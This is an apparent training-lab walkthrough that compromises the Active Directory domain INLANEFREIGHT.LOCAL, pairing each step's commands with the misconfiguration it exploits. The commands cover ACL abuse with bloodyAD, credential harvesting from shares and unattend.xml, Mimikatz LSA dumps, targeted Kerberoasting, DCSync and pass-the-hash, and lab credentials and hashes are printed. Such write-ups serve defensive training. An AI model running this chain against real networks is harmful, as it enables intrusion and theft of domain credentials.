# Simulated Privilege Escalation and Domain Compromise Walkthrough Lab
## Attack Chain: Command Reference

This document lists, in execution order, only the commands that directly contributed to achieving full domain compromise of `INLANEFREIGHT.LOCAL`, along with the underlying misconfiguration or security flaw that each step exploited.

---

### Stage 1: Initial Foothold — Credential Discovery on DEV01 (dmz01 pivot)

**Misconfiguration:** DotNetNuke web application allowed arbitrary file upload (allowable file extensions list was user-modifiable), enabling remote code execution. Combined with an unquoted/abusable service (PrintSpoofer-exploitable SeImpersonatePrivilege), this gave SYSTEM-level access.

Credentials for `hporter` were recovered from LSA secrets/cached domain logon data on the compromised `dmz01` host (out of scope for this command list — see original engagement notes). Starting point for AD enumeration:

```bash
nxc smb 172.16.8.3 -u hporter -p 'Gr8hambino!' -d inlanefreight.local
```

---

### Stage 2: Active Directory Enumeration (BloodHound)

**Misconfiguration:** No AD activity/anomaly monitoring in place; a standard low-privilege domain user was able to enumerate the entire directory structure via unauthenticated-adjacent LDAP queries.

```bash
bloodhound-python -u hporter -p 'Gr8hambino!' -d inlanefreight.local -ns 172.16.8.3 -c All --zip
```

```bash
sudo neo4j start
bloodhound
```

BloodHound analysis revealed: `hporter` has **ForceChangePassword** rights over `ssmalls`.

---

### Stage 3: Abuse ForceChangePassword (hporter → ssmalls)

**Misconfiguration:** Excessive/unnecessary delegated ACL — `hporter` was granted `ForceChangePassword` over `ssmalls` with no legitimate business justification, allowing any holder of `hporter`'s credentials to take over the `ssmalls` account without knowing its original password.

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u hporter -p 'Gr8hambino!' set password ssmalls mazoniakid
```

```bash
nxc smb 172.16.8.3 -u ssmalls -p 'mazoniakid' -d inlanefreight.local
```

---

### Stage 4: File Share Credential Harvesting (as ssmalls)

**Misconfiguration:** Weak NTFS/share permissions allowed a low-privileged domain user (`ssmalls`) read access to an IT department share containing hardcoded plaintext credentials in an operational script. This is a classic "secrets in scripts/shares" flaw — credentials should never be stored in plaintext on accessible file shares.

```bash
nxc smb 172.16.8.3 -u ssmalls -p 'mazoniakid' -d inlanefreight.local -M spider_plus --share 'Department Shares'
```

```bash
smbclient -U ssmalls '//172.16.8.3/Department Shares'
# > cd IT\Private\Development\
# > get "SQL Express Backup.ps1"
```

```bash
cat "SQL Express Backup.ps1"
# Reveals: backupadm : !qazXSW@
```

---

### Stage 5: WinRM Host Discovery and Lateral Movement (backupadm → MS01)

**Misconfiguration:** The `backupadm` service account (intended only for local SQL Express backup jobs) had valid WinRM/remote-management access to a general-purpose member server (MS01), violating the principle of least privilege for service accounts.

```bash
nmap -sT -Pn -p5985 172.16.8.0/24 -oG - | grep open
```

```bash
nxc winrm 172.16.8.50 -u backupadm -p '!qazXSW@' -d inlanefreight.local
```

```bash
evil-winrm -i 172.16.8.50 -u backupadm -p '!qazXSW@'
```

---

### Stage 6: Leftover Deployment Artifact Credential Exposure (MS01)

**Misconfiguration:** An unattended Windows installation answer file (`unattend.xml`) was left in `C:\panther\` after imaging/deployment, containing a plaintext local administrator-adjacent account password. Unattend files routinely contain autologon credentials and are a well-known post-deployment cleanup failure.

```powershell
# From the evil-winrm session on MS01
cd c:\panther
dir
type unattend.xml
# Reveals: ilfserveradm : Sys26Admin
```

---

### Stage 7: Local Privilege Escalation on MS01 (ilfserveradm → local Administrator)

**Misconfiguration:** Third-party software (Sysax Automation) installed a scheduled-task service running as `NT AUTHORITY\SYSTEM` that allowed any authenticated local user — including non-administrators — to configure triggered tasks that execute arbitrary commands as SYSTEM, with no privilege check on who could create/modify the task.

```bash
xfreerdp /v:172.16.8.50 /u:ilfserveradm /p:'Sys26Admin' /drive:home,"/home/issifu/htb"
```

*(GUI-driven step, no CLI equivalent: `pwn.bat` containing `net localgroup administrators ilfserveradm /add` was configured as a triggered task in Sysax Scheduled Service, set to run as SYSTEM with "Login as the following user" unchecked, then triggered by dropping a file into the monitored folder.)*

---

### Stage 8: LSA Secrets Dump on MS01 (ilfserveradm/SYSTEM → mssqladm)

**Misconfiguration:** A domain service account (`mssqladm`) was configured for autologon on MS01, storing its plaintext password in the registry (`HKLM\SECURITY` LSA secrets), which is trivially extractable by anyone with local Administrator/SYSTEM rights.

*(Windows-native step — no direct Linux equivalent for live registry-based LSA secret extraction; performed via Mimikatz on-target after achieving local admin in Stage 7.)*

```powershell
mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
# Reveals: DefaultPassword : DBAilfreight1!
```

```powershell
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\' -Name "DefaultUserName"
# Reveals: DefaultUserName : mssqladm
```

Confirmed credential pair: **mssqladm : DBAilfreight1!**

---

### Stage 9: Targeted Kerberoasting via GenericWrite (mssqladm → ttimmons)

**Misconfiguration:** `mssqladm` was delegated `GenericWrite` over the `ttimmons` user object with no restriction on which attributes could be modified, allowing an attacker to write an arbitrary Service Principal Name (SPN) to the account and force it to become Kerberoastable — even though `ttimmons` had no legitimate SPN of its own.

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u mssqladm -p 'DBAilfreight1!' set object ttimmons servicePrincipalName -v 'acmetesting/LEGIT'
```

```bash
GetUserSPNs.py -dc-ip 172.16.8.3 inlanefreight.local/mssqladm -request-user ttimmons -outputfile ttimmons_tgs.txt
```

```bash
hashcat -m 13100 ttimmons_tgs.txt /usr/share/wordlists/rockyou.txt
```

**Root cause of crackability:** `ttimmons` was using a weak, dictionary-guessable password (`Repeat09`), which allowed the Kerberos TGS ticket to be cracked offline via brute-force against a common wordlist.

Confirmed credential pair: **ttimmons : Repeat09**

---

### Stage 10: Privileged Group Self-Addition (ttimmons → Server Admins)

**Misconfiguration:** `ttimmons` held `GenericAll` over a custom "Server Admins" security group, allowing the account to add itself as a member and inherit that group's privileges — a critical over-permissioning flaw, since group membership control should never be delegated alongside membership in the group's own downstream privilege scope.

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u ttimmons -p 'Repeat09' add groupMember "Server Admins" ttimmons
```

```bash
bloodyAD --host 172.16.8.3 -d inlanefreight.local -u ttimmons -p 'Repeat09' get object ttimmons --attr memberOf
```

---

### Stage 11: DCSync Attack — Full Domain Credential Extraction

**Misconfiguration (critical/root cause):** The "Server Admins" custom group had been granted `GetChanges` and `GetChangesAll` extended rights on the domain object — replication rights that should be reserved exclusively for Domain Controllers and members of Domain Admins/Enterprise Admins. This single misconfiguration is what converts the entire preceding privilege-escalation chain into full domain compromise: any member of "Server Admins" can impersonate a Domain Controller and request replication of all domain secrets, including the `Administrator` NTLM hash.

```bash
secretsdump.py ttimmons:'Repeat09'@172.16.8.3 -just-dc-ntlm
```

**Result:** Full NTDS.DIT credential dump, including:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fd1f7e5564060258ea787ddbb6e6afa2:::
```

---

### Stage 12: Proof of Domain Compromise (Pass-the-Hash)

**Demonstrates impact:** No password cracking was required for this final step — the extracted NTLM hash was used directly to authenticate as `Administrator` on the Domain Controller via Pass-the-Hash, confirming complete, unrestricted domain compromise.

```bash
evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
```

```powershell
hostname   # DC01
whoami     # inlanefreight\administrator
```

---

## Summary of Root-Cause Misconfigurations

| # | Flaw | Impact |
|---|------|--------|
| 1 | Excessive delegated ACL (`ForceChangePassword`) | Allowed lateral account takeover without password knowledge |
| 2 | Plaintext credentials in scripts on accessible file shares | Enabled credential harvesting via weak share permissions |
| 3 | Service account with excessive remote-access rights | Enabled lateral movement beyond intended scope |
| 4 | Leftover `unattend.xml` deployment artifact | Exposed plaintext local account credentials |
| 5 | Vulnerable third-party scheduled-task service (Sysax) | Enabled unauthorized SYSTEM-level privilege escalation |
| 6 | Autologon-configured service account (LSA secrets) | Exposed domain service account credentials in cleartext |
| 7 | Excessive `GenericWrite` delegation | Enabled targeted Kerberoasting via fake SPN injection |
| 8 | Weak account password policy / no complexity enforcement | Allowed offline cracking of the Kerberoasted ticket |
| 9 | Excessive `GenericAll` on a privileged group | Enabled self-escalation into a privileged group |
| 10 | **Replication rights (`GetChanges`/`GetChangesAll`) on a non-DC group** | **Root cause of full domain compromise via DCSync** |

The chain illustrates a common real-world pattern: no single misconfiguration was catastrophic in isolation, but the *cumulative* effect of small, disconnected ACL and credential-hygiene failures produced a complete path from an initial low-privilege foothold to full domain compromise.
